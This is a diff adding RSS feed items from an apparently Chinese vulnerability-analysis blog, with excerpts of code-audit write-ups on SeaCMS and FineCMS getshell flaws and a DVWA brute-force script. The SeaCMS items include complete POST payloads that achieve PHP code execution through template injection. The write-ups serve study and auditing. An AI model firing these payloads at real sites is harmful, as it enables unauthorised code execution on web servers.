+      <title>SeaCMS v6.54和v6.55前台Getshell 代码执行漏洞(每日一洞)</title>
+      <link>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
+      <pubDate>Sat, 03 Mar 2018 23:32:41 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/seacms-v6.54-and-v6.55-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
+      <description>前言 这两个版本修复上次的v6.45版本中的order传值后执行的漏洞，但是在新的版本里面利用parseIf函数的功能还可以继续利用。 因为上一篇也已经过了一遍search.php的执行过程，这篇就不再重复讲解了。 链接：http://getpass.cn/2018/03/02/SeaCMS%20v6.45%E5%89%8D%E5%8F%B0Getshell%20%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E(%E6%AF%8F%E6%97%A5%E4%B8%80%E6%B4%9E)/
+环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
+v6.54漏洞详情 漏洞代码执行 Payload get:http://seacms.test/search.php POST: searchtype=5&amp;amp;searchword={if{searchpage:year}&amp;amp;year=:e{searchpage:area}}&amp;amp;area=v{searchpage:letter}&amp;amp;letter=al{searchpage:lang}&amp;amp;yuyan=(join{searchpage:jq}&amp;amp;jq=($_P{searchpage:ver}&amp;amp;ver=OST[9]))&amp;amp;9[]=ph&amp;amp;9[]=pinfo();
+执行结果 分析过程  这个版本只是把order的变量做了限制，但是声明为global变量的不止order,为什么不用其他而用order，在上一篇已经讲过了。  $order = RemoveXSS(stripslashes($order)); $order = addslashes(cn_substr($order,20));  我看了这次构造的POC，我也是佩服这位表哥，因为分析这些代码需要大量的时间。这次通过echoSearchPage函数里面的拼接功能，我们可以在没转换之前输出一下$content的内容，这里我推荐直接用highlight_string($content)直接输出，不用右键查看源代码了。 大家可以先在searchword替换前输出$content，可以看到还没有开始替换。 那我们在替换后，输出$content，可以看到已经拼接成型了。    156行 $content = str_replace(&amp;#34;{seacms:searchword}&amp;#34;,$searchword,$content); 。。。。。。。。。。 if(intval($searchtype)==5) { $tname = !empty($tid)?getTypeNameOnCache($tid):&amp;#39;全部&amp;#39;; $jq = !empty($jq)?$jq:&amp;#39;全部&amp;#39;; $area = !empty($area)?$area:&amp;#39;全部&amp;#39;; $year = !empty($year)?$year:&amp;#39;全部&amp;#39;; $yuyan = !empty($yuyan)?$yuyan:&amp;#39;全部&amp;#39;; $letter = !empty($letter)?$letter:&amp;#39;全部&amp;#39;; $state = !empty($state)?$state:&amp;#39;全部&amp;#39;; $ver = !</description>
+    </item>
+    
+    <item>
+      <title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</title>
+      <link>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</link>
+      <pubDate>Fri, 02 Mar 2018 19:28:36 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/seacms-v6.45-front-desk-getshell-code-execution-vulnerability-one-hole-a-day/</guid>
+      <description>前言 昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。
+环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7
+漏洞代码执行过程分析 先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。 漏洞详情 漏洞代码执行 Payload代码 http://seacms.test/search.php POST:searchtype=5&amp;amp;order=}{end if} {if:1)phpinfo();if(1}{end if}
+执行结果 分析过程  漏洞的触发点是在search.php 中的echoSearchPage()函数可以触发漏洞。常规的分析都是先找GET、POST的位置，在这个文件里面没有这些变量，原来是在./include/common.php里面。  if(PHP_VERSION &amp;lt; &amp;#39;4.1.0&amp;#39;) { $_GET = &amp;amp;$HTTP_GET_VARS; $_POST = &amp;amp;$HTTP_POST_VARS; $_COOKIE = &amp;amp;$HTTP_COOKIE_VARS; $_SERVER = &amp;amp;$HTTP_SERVER_VARS; $_ENV = &amp;amp;$HTTP_ENV_VARS; $_FILES = &amp;amp;$HTTP_POST_FILES; } ...... foreach(Array(&amp;#39;_GET&amp;#39;,&amp;#39;_POST&amp;#39;,&amp;#39;_COOKIE&amp;#39;) as $_request) { foreach($$_request as $_k =&amp;gt; $_v) ${$_k} = _RunMagicQuotes($_v); } 所以Payload用GET还是POST都是可以的。</description>
+    </item>
+    
+    <item>
+      <title>通杀FineCMS5.0.8及版本以下getshell的漏洞(每天一洞)</title>
+      <link>https://getshe11.com/posts/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</link>
+      <pubDate>Wed, 28 Feb 2018 22:23:23 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/kill-the-vulnerabilities-of-getshell-v.-finecms-5.0.8-and-below-1-hole-per-day/</guid>
+      <description>前言 这几天都挺忙的，刚开学也在做比赛的培训，每天一洞这个事情一定得坚持下去，跟着上次的finecms，在漏洞时代又找了一个漏洞来审计。但是他改了函数里面的传参，我也弄了一阵子才搞明白这个传参原来需要加密过的参数，还有就是这个远程下载再上传，有个小问题，那篇文章没有说明，等下再系统说下。
+漏洞详情 代码位置和代码  位置 \finecms\dayrui\controllers\member\Api.php 代码  public function down_file() { $p = array(); $url = explode(&amp;#39;&amp;amp;&amp;#39;, $this-&amp;gt;input-&amp;gt;post(&amp;#39;url&amp;#39;)); //经过&amp;amp; 分割  foreach ($url as $t) { $item = explode(&amp;#39;=&amp;#39;, $t); $p[$item[0]] = $item[1]; } //经过 = 分割  !$this-&amp;gt;uid &amp;amp;&amp;amp; exit(dr_json(0, fc_lang(&amp;#39;游客不允许上传附件&amp;#39;))); //对$p[&amp;#39;code&amp;#39;] 进行解码  list($size, $ext) = explode(&amp;#39;|&amp;#39;, dr_authcode($p[&amp;#39;code&amp;#39;], &amp;#39;DECODE&amp;#39;)); //得到尺寸和后缀  $path = SYS_UPLOAD_PATH.&amp;#39;/&amp;#39;.date(&amp;#39;Ym&amp;#39;, SYS_TIME).&amp;#39;/&amp;#39;; !is_dir($path) &amp;amp;&amp;amp; dr_mkdirs($path); $furl = $this-&amp;gt;input-&amp;gt;post(&amp;#39;file&amp;#39;); $file = dr_catcher_data($furl); //dr_catcher_data 是读取远程文件  !</description>
+    </item>
+    
+    <item>
+      <title>DVWA之Brute Force更新</title>
+      <link>https://getshe11.com/posts/dvwa-brute-force-update-/</link>
+      <pubDate>Wed, 28 Feb 2018 00:18:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/dvwa-brute-force-update-/</guid>
+      <description>前言 今天又练习了一遍DVWA，发现了一些小问题。
+问题一 在原文http://www.freebuf.com/articles/web/116437.html 中的python代码我重新运行了一遍，发现有错误。提示没有这个&#39;input&#39;的Type,所以我做了下修改就能正常运行了。 原先的user_token = soup.form.input.input.input.input[&amp;quot;value&amp;quot;] 改成了user_token = soup.find_all(&amp;quot;input&amp;quot;)[3].get(&amp;quot;value&amp;quot;)# get the user_token 代码如下：
+from bs4 import BeautifulSoup import urllib2 header={ &amp;#39;Host&amp;#39;: &amp;#39;192.168.59.127&amp;#39;, &amp;#39;Cache-Control&amp;#39;: &amp;#39;max-age=0&amp;#39;, &amp;#39;If-None-Match&amp;#39;: &amp;#34;307-52156c6a290c0&amp;#34;, &amp;#39;If-Modified-Since&amp;#39;: &amp;#39;Mon, 05 Oct 2015 07:51:07 GMT&amp;#39;, &amp;#39;User-Agent&amp;#39;: &amp;#39;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36&amp;#39;, &amp;#39;Accept&amp;#39;: &amp;#39;*/*&amp;#39;, &amp;#39;Referer&amp;#39;: &amp;#39;http://192.168.59.127/dvwa/vulnerabilities/brute/index.php&amp;#39;, &amp;#39;Accept-Encoding&amp;#39;: &amp;#39;gzip, deflate, sdch&amp;#39;, &amp;#39;Accept-Language&amp;#39;: &amp;#39;zh-CN,zh;q=0.8&amp;#39;, &amp;#39;Cookie&amp;#39;: &amp;#39;security=high; PHPSESSID=4ac4tdpdn25suknveha54ml3i2&amp;#39;} requrl = &amp;#34;http://192.168.59.127/dvwa/vulnerabilities/brute/&amp;#34; def get_token(requrl,header): req = urllib2.Request(url=requrl, headers=header) response = urllib2.</description>
+    </item>
+    
+    <item>
+      <title>FineCMS最新版5.0.8两处getshell(每天一洞)</title>
+      <link>https://getshe11.com/posts/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes/</link>
+      <pubDate>Tue, 30 Jan 2018 00:06:41 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/the-latest-version-of-finecms-5.0.8-getshell-daily-two-holes/</guid>
+      <description>前言 要专心学习代码审计了，看看能不能坚持每天去分析一个漏洞，我会去按照大神们分析的代码去读懂代码逻辑然后再写上自己的理解放在我的博客上面。在文章的末尾我会贴上文章的链接，尊重原作者的版权！
+第一处漏洞分析 漏洞文件位置和代码 代码位置：\finecms\dayrui\controllers\Api.php
+核心代码：
+public function data2() { $data = array(); // 来路认证  if (defined(&amp;#39;SYS_REFERER&amp;#39;) &amp;amp;&amp;amp; strlen(SYS_REFERER)) { $http = $_SERVER[&amp;#39;HTTP_REFERER&amp;#39;] ? $_SERVER[&amp;#39;HTTP_REFERER&amp;#39;] : $_GET[&amp;#39;http_referer&amp;#39;]; if (empty($http)) { $data = array(&amp;#39;msg&amp;#39; =&amp;gt; &amp;#39;来路认证失败（NULL）&amp;#39;, &amp;#39;code&amp;#39; =&amp;gt; 0); } elseif (strpos($http, SYS_REFERER) === FALSE) { $data = array(&amp;#39;msg&amp;#39; =&amp;gt; &amp;#39;来路认证失败（非法请求）&amp;#39;, &amp;#39;code&amp;#39; =&amp;gt; 0); } } //如果data为空就继续  if (!$data) { // 安全码认证  //从get接收auth的参数  $auth = $this-&amp;gt;input-&amp;gt;get(&amp;#39;auth&amp;#39;); //SYS_KEY的值为24b16fede9a67c9251d3e7c7161c83ac，如果auth不等于md5加密后的SYS_KEY就执行  if ($auth !</description>
+    </item>
+    
+  </channel>
+</rss>
